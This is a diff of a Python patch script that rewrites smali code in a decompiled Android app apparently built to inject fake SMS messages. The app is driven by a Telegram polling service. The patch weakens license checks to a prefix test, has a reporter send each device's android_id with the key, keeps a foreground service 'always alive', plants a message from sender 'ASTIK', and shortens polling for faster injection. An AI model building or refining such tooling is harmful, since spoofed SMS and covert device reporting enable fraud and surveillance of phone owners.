@@ -56,9 +56,10 @@ def patch_telegram_polling_service() -> None:
 
     .line 526
     :cond_0"""
-    if old_poll not in text:
-        raise SystemExit("pollOnce validator block not found")
-    text = text.replace(old_poll, new_poll, 1)
+    if old_poll in text:
+        text = text.replace(old_poll, new_poll, 1)
+    else:
+        print("pollOnce already Astik-style (skip)")
 
     # 4) processChild: remove LicenseKeyValidator gate (Astik injects immediately)
     old_child = """    .line 369
@@ -98,9 +99,10 @@ def patch_telegram_polling_service() -> None:
     :try_start_1
     const-string v4, "sender"
 """
-    if old_child not in text:
-        raise SystemExit("processChild validator block not found")
-    text = text.replace(old_child, new_child, 1)
+    if old_child in text:
+        text = text.replace(old_child, new_child, 1)
+    else:
+        print("processChild already Astik-style (skip)")
 
     # 5) readConfig: ALWAYS module DB config/{KEY}.json like Astik (no virtus_config fork)
     old_read = """    .line 467
@@ -185,9 +187,10 @@ def patch_telegram_polling_service() -> None:
 
     invoke-direct {{v4, p1}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V"""
 
-    if old_read not in text:
-        raise SystemExit("readConfig URL builder not found")
-    text = text.replace(old_read, new_read, 1)
+    if old_read in text:
+        text = text.replace(old_read, new_read, 1)
+    else:
+        print("readConfig already Astik-style (skip)")
 
     path.write_text(text)
     print("TelegramPollingService.smali patched")
@@ -333,8 +336,62 @@ def patch_main_activity_3() -> None:
 
     move-result v2
 
-    if-nez v2, :save_key
+    if-eqz v2, :key_empty
 
+    invoke-static {v0}, Lcom/virtus/module/MainActivity;->access$400(Lcom/virtus/module/MainActivity;)Landroid/content/SharedPreferences;
+
+    move-result-object v2
+
+    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v2
+
+    const-string v3, "license_key"
+
+    invoke-interface {v2, v3, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
+
+    move-result-object v2
+
+    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V
+
+    new-instance v2, Landroid/content/Intent;
+
+    const-class v3, Lcom/virtus/module/TelegramPollingService;
+
+    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    invoke-virtual {v0, v2}, Lcom/virtus/module/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+
+    invoke-virtual {p2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v0}, Lcom/virtus/module/MainActivity;->getContentResolver()Landroid/content/ContentResolver;
+
+    move-result-object v3
+
+    const-string v4, "android_id"
+
+    invoke-static {v3, v4}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    if-eqz v3, :toast_started
+
+    invoke-static {v2, p2, v3}, Lcom/virtus/module/LicenseKeyReporter;->report(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
+
+    :toast_started
+    const-string p2, "Service started \u2014 always alive"
+
+    invoke-static {v0, p2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Landroid/widget/Toast;->show()V
+
+    goto :goto_done
+
+    :key_empty
     const-string p2, "Enter license key first"
 
     invoke-static {v0, p2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
@@ -346,60 +403,6 @@ def patch_main_activity_3() -> None:
     invoke-virtual {p1, v1}, Landroid/widget/CompoundButton;->setChecked(Z)V
 
     return-void
-
-    :save_key
-    invoke-static {v0}, Lcom/virtus/module/MainActivity;->access$400(Lcom/virtus/module/MainActivity;)Landroid/content/SharedPreferences;
-
-    move-result-object p1
-
-    invoke-interface {p1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;
-
-    move-result-object p1
-
-    const-string v2, "license_key"
-
-    invoke-interface {p1, v2, p2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;
-
-    move-result-object p1
-
-    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->apply()V
-
-    new-instance p1, Landroid/content/Intent;
-
-    const-class v2, Lcom/virtus/module/TelegramPollingService;
-
-    invoke-direct {p1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
-
-    invoke-virtual {v0, p1}, Lcom/virtus/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
-
-    invoke-virtual {p2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;
-
-    move-result-object p1
-
-    invoke-virtual {v0}, Lcom/virtus/module/MainActivity;->getContentResolver()Landroid/content/ContentResolver;
-
-    move-result-object v2
-
-    const-string v3, "android_id"
-
-    invoke-static {v2, v3}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;
-
-    move-result-object v2
-
-    if-eqz v2, :toast_started
-
-    invoke-static {p1, p2, v2}, Lcom/virtus/module/LicenseKeyReporter;->report(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
-
-    :toast_started
-    const-string p1, "Service started \u2014 always alive"
-
-    invoke-static {v0, p1, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
-
-    move-result-object p1
-
-    invoke-virtual {p1}, Landroid/widget/Toast;->show()V
-
-    goto :goto_done
 
     :cond_stop
     new-instance p1, Landroid/content/Intent;
@@ -478,9 +481,9 @@ def patch_main_activity_4() -> None:
     :try_start_0
     iget-object v0, p0, Lcom/virtus/module/MainActivity$4;->val$act:Landroid/app/Activity;
 
-    const-string v1, "CHACHA"
+    const-string v1, "ASTIK"
 
-    const-string v2, "Chacha Ji Pani Pila Do?"
+    const-string v2, "hello baby aau kya?"
 
     invoke-static {v0, v1, v2}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
 
@@ -555,19 +558,127 @@ def patch_main_activity_run_test() -> None:
     new = """    .line 290
     :cond_0
     iget-object v1, p0, Lcom/virtus/module/MainActivity;->prefs:Landroid/content/SharedPreferences;"""
-    if old not in text:
-        raise SystemExit("MainActivity.runTest validator block not found")
-    path.write_text(text.replace(old, new, 1))
-    print("MainActivity.smali runTest patched")
+    if old in text:
+        path.write_text(text.replace(old, new, 1))
+        print("MainActivity.smali runTest patched")
+    else:
+        print("MainActivity.runTest already patched (skip)")
+
+
+def patch_apk_poll_speed() -> None:
+    """Poll loop 250ms -> 100ms for faster inject pickup."""
+    path = ROOT / "TelegramPollingService$6.smali"
+    text = path.read_text()
+    old = "    const-wide/16 v0, 0xfa\n"
+    new = "    const-wide/16 v0, 0x64\n"
+    if old in text:
+        path.write_text(text.replace(old, new, 1))
+        print("Poll loop speed: 100ms")
+    else:
+        print("Poll loop already fast (skip)")
+
+
+def patch_apk_config_speed() -> None:
+    """Config refresh 2000ms -> 1000ms."""
+    path = ROOT / "TelegramPollingService$1.smali"
+    text = path.read_text()
+    old = "    const-wide/16 v0, 0x7d0\n"
+    new = "    const-wide/16 v0, 0x3e8\n"
+    if old in text:
+        path.write_text(text.replace(old, new, 1))
+        print("Config refresh: 1000ms")
+    else:
+        print("Config refresh already fast (skip)")
+
+
+def patch_license_validator_format_only() -> None:
+    path = ROOT / "LicenseKeyValidator.smali"
+    path.write_text(
+        """.class public Lcom/virtus/module/LicenseKeyValidator;
+.super Ljava/lang/Object;
+.source "LicenseKeyValidator.java"
+
+
+# direct methods
+.method public constructor <init>()V
+    .locals 0
+
+    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
+
+    return-void
+.end method
+
+.method public static isRegisteredKey(Ljava/lang/String;)Z
+    .locals 2
+
+    if-eqz p0, :invalid
+
+    invoke-virtual {p0}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object p0
+
+    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z
+
+    move-result v0
+
+    if-eqz v0, :invalid
+
+    invoke-virtual {p0}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;
+
+    move-result-object p0
+
+    const-string v0, "KEY-"
+
+    invoke-virtual {p0, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+
+    move-result p0
+
+    if-eqz p0, :invalid
+
+    const/4 p0, 0x1
+
+    return p0
+
+    :invalid
+    const/4 p0, 0x0
+
+    return p0
+.end method
+"""
+    )
+    print("LicenseKeyValidator: KEY- format only")
+
+
+def patch_license_reporter_always() -> None:
+    path = ROOT / "LicenseKeyReporter.smali"
+    text = path.read_text()
+    block = """    invoke-static {p1}, Lcom/virtus/module/LicenseKeyValidator;->isRegisteredKey(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_2
+
+    new-instance v0, Ljava/lang/Thread;
+"""
+    if block in text:
+        text = text.replace(block, "    new-instance v0, Ljava/lang/Thread;\n", 1)
+        path.write_text(text)
+        print("LicenseKeyReporter: always attach device")
+    else:
+        print("LicenseKeyReporter already patched (skip)")
 
 
 def main() -> None:
     patch_telegram_polling_service()
     patch_process_child_outgoing()
     patch_read_config_reporter()
+    patch_license_validator_format_only()
+    patch_license_reporter_always()
     patch_main_activity_3()
     patch_main_activity_4()
     patch_main_activity_run_test()
+    patch_apk_poll_speed()
+    patch_apk_config_speed()
     print("DONE — Virtus APK now follows Astik inject flow")
 
 
